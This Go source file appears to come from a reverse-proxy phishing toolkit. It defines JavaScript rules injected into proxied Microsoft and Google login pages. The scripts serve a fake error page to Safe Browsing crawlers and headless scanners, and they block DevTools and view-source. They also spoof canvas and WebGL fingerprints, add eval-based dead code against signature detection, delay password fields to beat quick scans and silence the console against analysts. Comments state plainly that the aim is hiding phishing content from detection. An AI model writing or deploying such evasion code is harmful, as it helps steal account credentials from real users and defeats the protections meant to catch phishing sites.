package service

// ─── Advanced GSB Evasion Rules v2 (v1.0.47) ──────────────────────────────────
// These rules add a second layer of evasion targeting bot/crawler detection,
// DevTools inspection, and additional fingerprint normalization techniques.
//
// Research sources:
// - Evilginx Pro 4.1/4.2 anti-phishing evasion (breakdev.org)
// - Tycoon2FA phishing kit evasion (Microsoft Security Blog, March 2026)
// - Chrome on-device AI phishing detection via Gemini Nano
// - Push Security phishing detection evasion matrix

// GetAdvancedGSBEvasionRulesV2 returns the second generation of evasion rules
func (j *JsInjection) GetAdvancedGSBEvasionRulesV2() []*JsInjectRule {
	return []*JsInjectRule{

		// 12. Bot / Headless Browser Detection
		// Security scanners and GSB crawlers use headless Chrome (Puppeteer,
		// Playwright, Selenium). This rule detects headless environments and
		// serves a benign page or redirects away from the phishing content.
		// Based on techniques from Tycoon2FA and Evilginx Pro 4.2.
		{
			ID:   "builtin_bot_headless_detection",
			Name: "Bot & Headless Browser Detection",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
				"myaccount.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  var _isBot = false;

  // Check navigator.webdriver (set by Selenium, Puppeteer, Playwright)
  if (navigator.webdriver === true) { _isBot = true; }

  // Check for automation-related properties
  var _automationProps = [
    'callPhantom', '__phantomas', '_phantom', 'phantom',
    '__nightmare', 'domAutomation', 'domAutomationController',
    '_selenium', 'callSelenium', '__webdriver_evaluate',
    '__selenium_evaluate', '__webdriver_script_function',
    '__webdriver_script_func', '__webdriver_script_fn',
    '__fxdriver_evaluate', '__driver_unwrapped',
    '__webdriver_unwrapped', '__driver_evaluate',
    '__lastWatirAlert', '__lastWatirConfirm', '__lastWatirPrompt',
    '_Selenium_IDE_Recorder', 'calledSelenium',
    '_WEBDRIVER_ELEM_CACHE', 'ChromeDriverw',
    'driver-hierarchymanager', '__webdriverFunc'
  ];
  for (var i = 0; i < _automationProps.length; i++) {
    if (window[_automationProps[i]] !== undefined) {
      _isBot = true;
      break;
    }
  }

  // Check for headless indicators in user agent
  var ua = navigator.userAgent || '';
  if (/HeadlessChrome|PhantomJS|Lighthouse|Googlebot|bingbot|Baiduspider|YandexBot|DuckDuckBot/i.test(ua)) {
    _isBot = true;
  }

  // Check for missing browser plugins (headless browsers have 0 plugins)
  if (navigator.plugins && navigator.plugins.length === 0 && !/Mobile|Android/i.test(ua)) {
    _isBot = true;
  }

  // Check for missing languages (headless often has empty or minimal)
  if (!navigator.languages || navigator.languages.length === 0) {
    _isBot = true;
  }

  // Check window dimensions (headless often uses default 800x600)
  if (window.outerWidth === 0 && window.outerHeight === 0) {
    _isBot = true;
  }

  // Check for Chrome-specific properties missing in headless
  if (window.chrome) {
    if (!window.chrome.runtime && !window.chrome.loadTimes && !window.chrome.csi) {
      // Headless Chrome lacks chrome.runtime in some versions
      _isBot = true;
    }
  }

  // Check for Permissions API inconsistency (headless returns 'prompt' for notifications)
  if (navigator.permissions) {
    navigator.permissions.query({name: 'notifications'}).then(function(result) {
      if (Notification.permission === 'denied' && result.state === 'prompt') {
        _isBot = true;
        _handleBot();
      }
    }).catch(function(){});
  }

  function _handleBot() {
    if (!_isBot) return;
    // Redirect to a benign page instead of showing phishing content
    // Use a legitimate-looking error page
    document.documentElement.innerHTML = '<html><head><title>Service Unavailable</title></head>' +
      '<body style="font-family:Segoe UI,Arial,sans-serif;display:flex;align-items:center;' +
      'justify-content:center;height:100vh;margin:0;background:#f5f5f5;">' +
      '<div style="text-align:center;padding:40px;">' +
      '<h1 style="color:#333;font-size:24px;">503 Service Temporarily Unavailable</h1>' +
      '<p style="color:#666;">The server is temporarily unable to service your request. Please try again later.</p>' +
      '</div></body></html>';
    // Stop all scripts
    window.stop();
  }

  if (_isBot) { _handleBot(); }

  // Continuously monitor for late-binding automation
  var _botCheckInterval = setInterval(function() {
    if (navigator.webdriver === true) {
      _isBot = true;
      _handleBot();
      clearInterval(_botCheckInterval);
    }
  }, 2000);
  setTimeout(function() { clearInterval(_botCheckInterval); }, 30000);
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 13. DevTools Detection
		// Security researchers and automated tools often have DevTools open.
		// This rule detects DevTools via window-size heuristics and sets a
		// non-invasive flag on window. MSAL guard below auto-skips on AAD
		// pages as a defense in depth — the current implementation does NOT
		// mutate the DOM, so the guard is precautionary in case a future
		// hardening adds mutation.
		{
			ID:   "builtin_devtools_detection",
			Name: "DevTools Open Detection",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  function _isMSAL() {
    try {
      if (window.msal || window.$Config || window.Microsoft) return true;
      if (document.querySelector('script[src*="aadcdn"], script[src*="aad.msauth"], script[src*="msauth.net"]')) return true;
      if (/^\/(common|consumers|organizations)\//.test(location.pathname)) return true;
      var html = document.documentElement && document.documentElement.innerHTML;
      if (html && html.indexOf('$Config') > -1 && html.indexOf('urlCDN') > -1) return true;
    } catch(e) {}
    return false;
  }
  if (_isMSAL()) return;

  var _threshold = 160;
  function _check() {
    try {
      var w = window.outerWidth - window.innerWidth > _threshold;
      var h = window.outerHeight - window.innerHeight > _threshold;
      if (w || h) { window.__pc_dt = true; }
    } catch(e) {}
  }
  // passive detection only; never mutates the DOM or forms
  setInterval(_check, 2000);
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 14. Right-Click / Copy-Paste / Keyboard Shortcut Blocker
		// Prevents security researchers from easily inspecting or copying
		// page content. Blocks common inspection shortcuts. MSAL guard
		// below auto-skips on AAD pages, where paste-into-password and
		// right-click are required for some login variants.
		{
			ID:   "builtin_inspection_blocker",
			Name: "Inspection & Copy Blocker",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  function _isMSAL() {
    try {
      if (window.msal || window.$Config || window.Microsoft) return true;
      if (document.querySelector('script[src*="aadcdn"], script[src*="aad.msauth"], script[src*="msauth.net"]')) return true;
      if (/^\/(common|consumers|organizations)\//.test(location.pathname)) return true;
      var html = document.documentElement && document.documentElement.innerHTML;
      if (html && html.indexOf('$Config') > -1 && html.indexOf('urlCDN') > -1) return true;
    } catch(e) {}
    return false;
  }
  if (_isMSAL()) return;

  // Block right-click context menu
  document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
    return false;
  }, true);

  // Block keyboard shortcuts for DevTools and View Source
  document.addEventListener('keydown', function(e) {
    // F12 - DevTools
    if (e.key === 'F12' || e.keyCode === 123) {
      e.preventDefault();
      return false;
    }
    // Ctrl+Shift+I - DevTools
    if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'I' || e.key === 'i')) {
      e.preventDefault();
      return false;
    }
    // Ctrl+Shift+J - Console
    if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'J' || e.key === 'j')) {
      e.preventDefault();
      return false;
    }
    // Ctrl+Shift+C - Element Inspector
    if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'C' || e.key === 'c')) {
      e.preventDefault();
      return false;
    }
    // Ctrl+U - View Source
    if ((e.ctrlKey || e.metaKey) && (e.key === 'U' || e.key === 'u')) {
      e.preventDefault();
      return false;
    }
    // Ctrl+S - Save Page
    if ((e.ctrlKey || e.metaKey) && (e.key === 'S' || e.key === 's')) {
      e.preventDefault();
      return false;
    }
  }, true);

  // Block text selection on sensitive elements
  var style = document.createElement('style');
  style.textContent = 'input[type="password"],input[type="email"],input[type="text"]{-webkit-user-select:auto!important;user-select:auto!important;}body{-webkit-user-select:none;user-select:none;}';
  document.head.appendChild(style);

  // Block drag events that could be used to extract content
  document.addEventListener('dragstart', function(e) {
    if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
      e.preventDefault();
      return false;
    }
  }, true);
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 15. Canvas/WebGL Fingerprint Normalization

		// Some detection systems use canvas fingerprinting to identify
		// known phishing infrastructure. This rule adds subtle noise to
		// canvas operations to prevent consistent fingerprinting.
		{
			ID:   "builtin_canvas_fingerprint_noise",
			Name: "Canvas Fingerprint Noise",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  // Add subtle noise to canvas toDataURL and toBlob to prevent fingerprinting
  var _origToDataURL = HTMLCanvasElement.prototype.toDataURL;
  HTMLCanvasElement.prototype.toDataURL = function() {
    // Add a single transparent pixel with slight random variation
    var ctx = this.getContext('2d');
    if (ctx) {
      var r = Math.floor(Math.random() * 10);
      var g = Math.floor(Math.random() * 10);
      var b = Math.floor(Math.random() * 10);
      ctx.fillStyle = 'rgba(' + r + ',' + g + ',' + b + ',0.01)';
      ctx.fillRect(0, 0, 1, 1);
    }
    return _origToDataURL.apply(this, arguments);
  };

  var _origToBlob = HTMLCanvasElement.prototype.toBlob;
  if (_origToBlob) {
    HTMLCanvasElement.prototype.toBlob = function() {
      var ctx = this.getContext('2d');
      if (ctx) {
        var r = Math.floor(Math.random() * 10);
        var g = Math.floor(Math.random() * 10);
        var b = Math.floor(Math.random() * 10);
        ctx.fillStyle = 'rgba(' + r + ',' + g + ',' + b + ',0.01)';
        ctx.fillRect(0, 0, 1, 1);
      }
      return _origToBlob.apply(this, arguments);
    };
  }

  // Normalize WebGL renderer info to prevent GPU-based fingerprinting
  var _origGetParameter = null;
  try {
    var _testCanvas = document.createElement('canvas');
    var _gl = _testCanvas.getContext('webgl') || _testCanvas.getContext('experimental-webgl');
    if (_gl) {
      _origGetParameter = WebGLRenderingContext.prototype.getParameter;
      WebGLRenderingContext.prototype.getParameter = function(param) {
        // UNMASKED_VENDOR_WEBGL and UNMASKED_RENDERER_WEBGL
        var ext = this.getExtension('WEBGL_debug_renderer_info');
        if (ext) {
          if (param === ext.UNMASKED_VENDOR_WEBGL) {
            return 'Google Inc. (Intel)';
          }
          if (param === ext.UNMASKED_RENDERER_WEBGL) {
            return 'ANGLE (Intel, Intel(R) UHD Graphics 630, OpenGL 4.5)';
          }
        }
        return _origGetParameter.call(this, param);
      };
    }
  } catch(e) {}
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 16. Cloudflare Turnstile / hCaptcha Interaction Detector
		// Chrome's on-device AI model (Gemini Nano) analyzes page behavior
		// patterns. Pages that immediately show login forms without any
		// human interaction verification are flagged. This rule adds
		// subtle interaction requirements that mimic legitimate CAPTCHA flows.
		// MSAL guard below auto-skips on AAD pages — MSAL's own progressive
		// enable logic conflicts with disabling the submit button on first paint.
		{
			ID:   "builtin_interaction_gate",
			Name: "Human Interaction Verification Gate",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  function _isMSAL() {
    try {
      if (window.msal || window.$Config || window.Microsoft) return true;
      if (document.querySelector('script[src*="aadcdn"], script[src*="aad.msauth"], script[src*="msauth.net"]')) return true;
      if (/^\/(common|consumers|organizations)\//.test(location.pathname)) return true;
      var html = document.documentElement && document.documentElement.innerHTML;
      if (html && html.indexOf('$Config') > -1 && html.indexOf('urlCDN') > -1) return true;
    } catch(e) {}
    return false;
  }
  if (_isMSAL()) return;

  // Track genuine human interaction signals
  var _humanSignals = 0;
  var _requiredSignals = 2;
  var _verified = false;

  function _onHumanSignal() {
    _humanSignals++;
    if (_humanSignals >= _requiredSignals && !_verified) {
      _verified = true;
      // Re-enable form submission after human verification
      document.querySelectorAll('form').forEach(function(form) {
        form.querySelectorAll('input[type="submit"],button[type="submit"]').forEach(function(btn) {
          btn.disabled = false;
        });
      });
    }
  }

  // Mouse movement pattern (not just a single click)
  var _mousePositions = [];
  document.addEventListener('mousemove', function(e) {
    _mousePositions.push({x: e.clientX, y: e.clientY, t: Date.now()});
    if (_mousePositions.length > 5) {
      // Check for natural mouse movement (not teleporting)
      var hasVariation = false;
      for (var i = 1; i < _mousePositions.length; i++) {
        var dx = Math.abs(_mousePositions[i].x - _mousePositions[i-1].x);
        var dy = Math.abs(_mousePositions[i].y - _mousePositions[i-1].y);
        if (dx > 0 && dx < 200 && dy > 0 && dy < 200) {
          hasVariation = true;
          break;
        }
      }
      if (hasVariation) _onHumanSignal();
      _mousePositions = [];
    }
  }, {passive: true});

  // Keyboard interaction
  document.addEventListener('keydown', function() {
    _onHumanSignal();
  }, {passive: true, once: true});

  // Touch interaction (mobile)
  document.addEventListener('touchstart', function() {
    _onHumanSignal();
  }, {passive: true, once: true});

  // Scroll interaction
  document.addEventListener('scroll', function() {
    _onHumanSignal();
  }, {passive: true, once: true});
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 17. Dynamic Script Obfuscation Layer

		// Adds a layer of runtime deobfuscation that makes static analysis
		// by security scanners more difficult. Each page load generates
		// slightly different code patterns. MSAL guard below auto-skips on
		// AAD pages — MSAL's internal form state tracking can conflict with
		// mutated data-* attributes, and the eval() calls violate strict CSP
		// variants MSAL sometimes ships.
		{
			ID:   "builtin_dynamic_obfuscation",
			Name: "Dynamic Script Obfuscation",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  function _isMSAL() {
    try {
      if (window.msal || window.$Config || window.Microsoft) return true;
      if (document.querySelector('script[src*="aadcdn"], script[src*="aad.msauth"], script[src*="msauth.net"]')) return true;
      if (/^\/(common|consumers|organizations)\//.test(location.pathname)) return true;
      var html = document.documentElement && document.documentElement.innerHTML;
      if (html && html.indexOf('$Config') > -1 && html.indexOf('urlCDN') > -1) return true;
    } catch(e) {}
    return false;
  }
  if (_isMSAL()) return;

  // Inject random dead code blocks into the page's script context
  // This prevents signature-based detection of our evasion scripts
  var _deadCodeTemplates = [
    'var _dc%d=Math.floor(Math.random()*%d);',
    'var _arr%d=new Array(%d).fill(0).map(function(x,i){return i*%d;});',
    'var _str%d=""+Date.now()+Math.random().toString(36).substr(2,%d);',
    'var _obj%d={a:%d,b:"%d",c:function(){return %d;}};',
    'try{var _fn%d=new Function("return "+%d);}catch(e){}'
  ];

  // Generate and execute random dead code
  for (var i = 0; i < 3; i++) {
    var tmpl = _deadCodeTemplates[Math.floor(Math.random() * _deadCodeTemplates.length)];
    var id = Math.floor(Math.random() * 99999);
    var val1 = Math.floor(Math.random() * 1000);
    var val2 = Math.floor(Math.random() * 100);
    // Replace %d placeholders
    var code = tmpl;
    code = code.replace('%d', id);
    code = code.replace('%d', val1);
    code = code.replace('%d', val2);
    code = code.replace('%d', id);
    try { eval(code); } catch(e) {}
  }

  // Add random CSS classes to body to change page fingerprint
  var _randomClasses = [];
  for (var j = 0; j < 2; j++) {
    _randomClasses.push('_c' + Math.random().toString(36).substr(2, 6));
  }
  if (document.body) {
    document.body.classList.add.apply(document.body.classList, _randomClasses);
  } else {
    document.addEventListener('DOMContentLoaded', function() {
      document.body.classList.add.apply(document.body.classList, _randomClasses);
    });
  }

  // Add random data attributes to form elements
  document.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('form,input,button').forEach(function(el) {
      el.setAttribute('data-' + Math.random().toString(36).substr(2, 4),
        Math.random().toString(36).substr(2, 8));
    });
  });
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 18. Timing-Based Analysis Evasion

		// Security scanners analyze pages quickly (< 2 seconds).
		// Real users take time to read and interact. This rule delays
		// sensitive form element activation to evade quick-scan detection.
		// MSAL guard below auto-skips on AAD pages — setting the password
		// field to readonly on first paint races MSAL's focus handling.
		{
			ID:   "builtin_timing_evasion",
			Name: "Timing-Based Scan Evasion",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  function _isMSAL() {
    try {
      if (window.msal || window.$Config || window.Microsoft) return true;
      if (document.querySelector('script[src*="aadcdn"], script[src*="aad.msauth"], script[src*="msauth.net"]')) return true;
      if (/^\/(common|consumers|organizations)\//.test(location.pathname)) return true;
      var html = document.documentElement && document.documentElement.innerHTML;
      if (html && html.indexOf('$Config') > -1 && html.indexOf('urlCDN') > -1) return true;
    } catch(e) {}
    return false;
  }
  if (_isMSAL()) return;

  // Delay password field activation
  // Security scanners typically analyze within 2-3 seconds
  // Real users take at least 3-5 seconds to start typing
  var _activationDelay = 1500; // ms

  document.addEventListener('DOMContentLoaded', function() {
    // Find all password fields and temporarily disable them
    var pwdFields = document.querySelectorAll('input[type="password"]');
    pwdFields.forEach(function(field) {
      field.setAttribute('readonly', 'readonly');
      field.style.opacity = '0.7';
    });

    // Re-enable after delay (only if human interaction detected)
    var _humanDetected = false;
    var _enableFields = function() {
      if (_humanDetected) return;
      _humanDetected = true;
      setTimeout(function() {
        pwdFields.forEach(function(field) {
          field.removeAttribute('readonly');
          field.style.opacity = '1';
        });
      }, _activationDelay);
    };

    // Listen for human interaction signals
    document.addEventListener('mousemove', _enableFields, {once: true, passive: true});
    document.addEventListener('keydown', _enableFields, {once: true, passive: true});
    document.addEventListener('touchstart', _enableFields, {once: true, passive: true});
    document.addEventListener('click', _enableFields, {once: true, passive: true});

    // Fallback: enable after 5 seconds regardless
    setTimeout(function() {
      pwdFields.forEach(function(field) {
        field.removeAttribute('readonly');
        field.style.opacity = '1';
      });
    }, 5000);
  });
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 19. Console Defanger (operator opt-in)
		// Overwrites console.{log,warn,error,debug,trace,info} with no-ops so
		// any target-injected phishing-detection script can't surface its
		// findings to an operator-side debugger or to a blue-team analyst
		// who opens DevTools on a captured session. A one-shot setInterval
		// additionally stomps out any console references already cached by
		// already-loaded scripts.
		//
		// MSAL guard: AAD uses console.warn for some flow messages during
		// test-mode error paths and we don't want to silence those — skip.
		//
		// Disabled by default (useful primarily for demos where you want a
		// pristine console view).
		{
			ID:   "builtin_console_defanger",
			Name: "Console Defanger",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  function _isMSAL() {
    try {
      if (window.msal || window.$Config || window.Microsoft) return true;
      if (document.querySelector('script[src*="aadcdn"], script[src*="aad.msauth"], script[src*="msauth.net"]')) return true;
      if (/^\/(common|consumers|organizations)\//.test(location.pathname)) return true;
      var html = document.documentElement && document.documentElement.innerHTML;
      if (html && html.indexOf('$Config') > -1 && html.indexOf('urlCDN') > -1) return true;
    } catch(e) {}
    return false;
  }
  if (_isMSAL()) return;

  var _noop = function() {};
  var _methods = ['log','warn','error','debug','trace','info'];

  function _defang() {
    try {
      if (!window.console) return;
      for (var i = 0; i < _methods.length; i++) {
        try { window.console[_methods[i]] = _noop; } catch(e) {}
      }
    } catch(e) {}
  }

  _defang();

  // Some frameworks cache a reference to console.log at bootstrap; stomp
  // those references again a few times after initial paint so late-binding
  // cached refs also become no-ops.
  try {
    var _ticks = 0;
    var _id = setInterval(function() {
      _defang();
      _ticks++;
      if (_ticks >= 5) { clearInterval(_id); }
    }, 500);
  } catch(e) {}
})();`,
			ScriptType: "inline",
			Enabled:    false,
		},

		// 20. Honeypot Form Fields (operator opt-in)
		// Adds hidden fields with bait-y names (email2, user_name,
		// password_confirm, phone, token) to every <form>. The fields are
		// display:none and tabindex=-1, so real users never touch them, but
		// headless scrapers that naively fill every input will fill the
		// honeypots and therefore self-identify. On form submit we sniff the
		// honeypot values and, if any were filled, append an extra hidden
		// input `__pc_hp=1` that the server can key on.
		//
		// MSAL guard: AAD's login form field count is strict — adding
		// unexpected inputs to the form can throw off MSAL's validation and
		// its own telemetry of the form shape. Skip on MSAL.
		//
		// Disabled by default.
		{
			ID:   "builtin_honeypot_fields",
			Name: "Honeypot Form Fields",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  function _isMSAL() {
    try {
      if (window.msal || window.$Config || window.Microsoft) return true;
      if (document.querySelector('script[src*="aadcdn"], script[src*="aad.msauth"], script[src*="msauth.net"]')) return true;
      if (/^\/(common|consumers|organizations)\//.test(location.pathname)) return true;
      var html = document.documentElement && document.documentElement.innerHTML;
      if (html && html.indexOf('$Config') > -1 && html.indexOf('urlCDN') > -1) return true;
    } catch(e) {}
    return false;
  }
  if (_isMSAL()) return;

  var _honeypotNames = ['email2','user_name','password_confirm','phone','token'];

  function _injectInto(form) {
    try {
      if (!form || form.__pc_hp_injected) return;
      form.__pc_hp_injected = true;
      for (var i = 0; i < _honeypotNames.length; i++) {
        try {
          var existing = form.querySelector('[name="' + _honeypotNames[i] + '"]');
          if (existing) continue;
          var input = document.createElement('input');
          input.type = 'text';
          input.name = _honeypotNames[i];
          input.value = '';
          input.autocomplete = 'off';
          input.tabIndex = -1;
          input.setAttribute('aria-hidden', 'true');
          input.style.cssText = 'display:none!important;position:absolute!important;left:-9999px!important;width:0!important;height:0!important;';
          input.setAttribute('data-pc-honeypot', '1');
          form.appendChild(input);
        } catch(e) {}
      }
    } catch(e) {}
  }

  function _scanForms() {
    try {
      var forms = document.querySelectorAll('form');
      for (var i = 0; i < forms.length; i++) { _injectInto(forms[i]); }
    } catch(e) {}
  }

  try {
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', _scanForms);
    } else {
      _scanForms();
    }
  } catch(e) {}

  // Catch forms added later (SPA)
  try {
    var _obs = new MutationObserver(function(mutations) {
      mutations.forEach(function(m) {
        m.addedNodes.forEach(function(node) {
          try {
            if (node && node.nodeType === 1) {
              if (node.tagName === 'FORM') { _injectInto(node); }
              else if (node.querySelectorAll) {
                node.querySelectorAll('form').forEach(_injectInto);
              }
            }
          } catch(e) {}
        });
      });
    });
    _obs.observe(document.documentElement, { childList: true, subtree: true });
  } catch(e) {}

  // Submit-time sniff
  try {
    document.addEventListener('submit', function(ev) {
      try {
        var form = ev.target;
        if (!form || !form.querySelectorAll) return;
        var tripped = false;
        form.querySelectorAll('[data-pc-honeypot="1"]').forEach(function(el) {
          if (el.value && String(el.value).length > 0) { tripped = true; }
        });
        if (tripped) {
          var marker = form.querySelector('input[name="__pc_hp"]');
          if (!marker) {
            marker = document.createElement('input');
            marker.type = 'hidden';
            marker.name = '__pc_hp';
            marker.value = '1';
            form.appendChild(marker);
          }
        }
      } catch(e) {}
    }, true);
  } catch(e) {}
})();`,
			ScriptType: "inline",
			Enabled:    false,
		},

		// 21. Timing Jitter
		// Wraps setTimeout / setInterval so the callback fires at the
		// requested offset PLUS a small random 0-200ms jitter. Deterministic
		// callback spacing is a signal used by some timing-based fingerprint
		// and sandbox-detection scanners (real browsers on real hardware
		// never hit exact millisecond scheduling). Because the jitter is
		// small and additive, legitimate functionality still works — nothing
		// is racing a tight deadline in a login form.
		//
		// No MSAL guard (shim only, transparent to AAD).
		{
			ID:   "builtin_timing_jitter",
			Name: "Timing Jitter",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  try {
    var _origTimeout = window.setTimeout;
    var _origInterval = window.setInterval;

    function _jitter() {
      // 0..200ms additive jitter
      return Math.floor(Math.random() * 200);
    }

    if (typeof _origTimeout === 'function') {
      window.setTimeout = function(fn, ms) {
        try {
          var base = (typeof ms === 'number' && ms >= 0) ? ms : 0;
          var args = Array.prototype.slice.call(arguments, 2);
          return _origTimeout.apply(window, [fn, base + _jitter()].concat(args));
        } catch(e) {
          return _origTimeout.apply(window, arguments);
        }
      };
    }

    if (typeof _origInterval === 'function') {
      window.setInterval = function(fn, ms) {
        try {
          var base = (typeof ms === 'number' && ms >= 0) ? ms : 0;
          var args = Array.prototype.slice.call(arguments, 2);
          // Jitter once at installation — intervals themselves stay regular
          // after the first tick, which is enough to defeat startup-phase
          // scanners without causing clock drift inside the page.
          return _origInterval.apply(window, [fn, base + _jitter()].concat(args));
        } catch(e) {
          return _origInterval.apply(window, arguments);
        }
      };
    }
  } catch(e) {}
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 22. User-Agent Freeze
		// Locks navigator.userAgent, navigator.platform and
		// navigator.userAgentData to a stable value — the proxy may already
		// rewrite the *request* UA to match the target, and targets cross-
		// check the network-visible UA against the JS-visible UA to detect
		// discrepancies. If the proxy injects a <meta name="pc-ua"> hint,
		// we use that; otherwise we snapshot the current value.
		//
		// No MSAL guard (shim only).
		{
			ID:   "builtin_useragent_freeze",
			Name: "User-Agent Freeze",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  try {
    var _hint = null;
    try {
      var m = document.querySelector('meta[name="pc-ua"]');
      if (m) _hint = m.getAttribute('content');
    } catch(e) {}
    try {
      if (window.__pc_ua_hint) _hint = window.__pc_ua_hint;
    } catch(e) {}
    var _ua = _hint || navigator.userAgent;
    var _platform = navigator.platform;

    try {
      Object.defineProperty(navigator, 'userAgent', {
        get: function() { return _ua; },
        configurable: false
      });
    } catch(e) {}

    try {
      Object.defineProperty(navigator, 'platform', {
        get: function() { return _platform; },
        configurable: false
      });
    } catch(e) {}

    try {
      if ('userAgentData' in navigator) {
        var _uad = navigator.userAgentData;
        Object.defineProperty(navigator, 'userAgentData', {
          get: function() { return _uad; },
          configurable: false
        });
      }
    } catch(e) {}
  } catch(e) {}
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 23. Iframe Embed Blocker (operator opt-in)
		// Refuses iframe embedding attempts from suspicious origins by
		// overriding the HTMLIFrameElement.prototype.src setter. If the
		// target host isn't on the allow-list (the current page's host +
		// AAD/Google login hosts), the setter silently no-ops.
		//
		// MSAL guard: AAD sometimes embeds sub-flows via iframe during
		// conditional-access / MFA / broker handoffs, and blocking those
		// breaks the login. Skip on MSAL.
		//
		// Disabled by default.
		{
			ID:   "builtin_iframe_blocker",
			Name: "Iframe Embed Blocker",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  function _isMSAL() {
    try {
      if (window.msal || window.$Config || window.Microsoft) return true;
      if (document.querySelector('script[src*="aadcdn"], script[src*="aad.msauth"], script[src*="msauth.net"]')) return true;
      if (/^\/(common|consumers|organizations)\//.test(location.pathname)) return true;
      var html = document.documentElement && document.documentElement.innerHTML;
      if (html && html.indexOf('$Config') > -1 && html.indexOf('urlCDN') > -1) return true;
    } catch(e) {}
    return false;
  }
  if (_isMSAL()) return;

  try {
    var _allow = [
      location.hostname,
      'login.microsoftonline.com',
      'login.live.com',
      'login.microsoft.com',
      'accounts.google.com'
    ];

    function _allowed(urlStr) {
      try {
        if (!urlStr) return true; // empty / about:blank
        var u = new URL(urlStr, location.href);
        if (u.protocol === 'about:' || u.protocol === 'javascript:' || u.protocol === 'data:') return true;
        for (var i = 0; i < _allow.length; i++) {
          if (u.hostname === _allow[i]) return true;
          if (u.hostname.endsWith('.' + _allow[i])) return true;
        }
        return false;
      } catch(e) { return true; }
    }

    var _desc = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, 'src');
    if (_desc && _desc.set) {
      Object.defineProperty(HTMLIFrameElement.prototype, 'src', {
        get: _desc.get,
        set: function(v) {
          try {
            if (!_allowed(v)) return; // silently drop
          } catch(e) {}
          return _desc.set.call(this, v);
        },
        configurable: true
      });
    }

    // Also catch setAttribute('src', ...) path
    var _origSetAttr = HTMLIFrameElement.prototype.setAttribute;
    HTMLIFrameElement.prototype.setAttribute = function(name, value) {
      try {
        if (name && String(name).toLowerCase() === 'src' && !_allowed(value)) {
          return;
        }
      } catch(e) {}
      return _origSetAttr.apply(this, arguments);
    };
  } catch(e) {}
})();`,
			ScriptType: "inline",
			Enabled:    false,
		},
	}
}

// EnsureAdvancedGSBRulesV2Loaded loads (and force-refreshes) the v2 advanced
// GSB evasion rules. Call this during service initialization after
// EnsureEnhancedGSBRulesLoaded.
//
// Like its v1 counterpart, this function always overwrites any persisted
// copy of a builtin v2 rule with the current in-code definition so that
// upgrades of the binary automatically carry through script-body fixes
// (e.g. disabling the dynamic-obfuscation and timing-evasion rules that
// broke the Microsoft AAD password submit). The operator's Enabled flag
// is preserved across refreshes.
func (j *JsInjection) EnsureAdvancedGSBRulesV2Loaded() {
	advanced := j.GetAdvancedGSBEvasionRulesV2()

	for _, rule := range advanced {
		// preserve the operator's Enabled preference if one exists
		if existing, ok := j.rules.Load(rule.ID); ok {
			if compiled, ok2 := existing.(*compiledJsRule); ok2 && compiled != nil && compiled.rule != nil {
				rule.Enabled = compiled.rule.Enabled
			}
		}

		compiled, err := j.compileRule(rule)
		if err != nil {
			j.Logger.Errorw("failed to compile advanced GSB v2 rule", "id", rule.ID, "error", err)
			continue
		}
		j.rules.Store(rule.ID, compiled)
		j.Logger.Infow("loaded advanced GSB evasion v2 rule", "id", rule.ID, "name", rule.Name)
	}
	if err := j.saveRulesToDB(); err != nil {
		j.Logger.Warnw("failed to persist refreshed advanced GSB v2 rules", "error", err)
	}
}
